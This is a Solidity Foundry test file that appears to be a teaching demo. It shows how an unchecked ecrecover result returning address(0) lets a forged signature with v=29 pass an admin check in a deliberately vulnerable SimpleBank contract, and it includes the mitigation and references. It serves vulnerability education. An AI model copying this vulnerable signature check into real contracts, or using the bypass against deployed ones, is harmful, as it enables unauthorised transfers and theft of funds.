// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/*
Name: ecrecover returns address(0)

Description:
In the SimpleBank contract, the transfer function takes a message hash and a signature (v, r, s values) as inputs.
It recovers the signer address and checks if it equals Admin. The vulnerability lies in the fact 
that the ecrecover function may return a 0x0 address when the signature parameters 
are invali, If v value isn't 27 or 28. it will return address(0).

Mitigation:  
Verify that the result from ecrecover isn't 0 or instead use OpenZeppelin’s ECDSA library.

REF:
https://twitter.com/1nf0s3cpt/status/1674268926761668608
https://github.com/code-423n4/2021-09-swivel-findings/issues/61
https://github.com/Kaiziron/numen_ctf_2023_writeup/blob/main/wallet.md
*/

contract ContractTest is Test {
    SimpleBank SimpleBankContract;

    function setUp() public {
        SimpleBankContract = new SimpleBank();
    }

    function testecRecover() public {
        emit log_named_decimal_uint(
            "Before exploiting, my balance",
            SimpleBankContract.getBalance(address(this)),
            18
        );
        bytes32 _hash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32")
        );
        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);

        // If v value isn't 27 or 28. it will return address(0)
        uint8 v = 29;
        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);

        emit log_named_decimal_uint(
            "After exploiting, my balance",
            SimpleBankContract.getBalance(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract SimpleBank {
    mapping(address => uint256) private balances;
    address Admin; //default is address(0)

    function getBalance(address _account) public view returns (uint256) {
        return balances[_account];
    }

    function recoverSignerAddress(
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) private pure returns (address) {
        address recoveredAddress = ecrecover(_hash, _v, _r, _s);
        return recoveredAddress;
    }

    function transfer(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(_to != address(0), "Invalid recipient address");

        address signer = recoverSignerAddress(_hash, _v, _r, _s);
        console.log("signer", signer);
        //Mitigation
        //require(signer != address(0), "Invalid signature");
        require(signer == Admin, "Invalid signature");

        balances[_to] += _amount;
    }
}
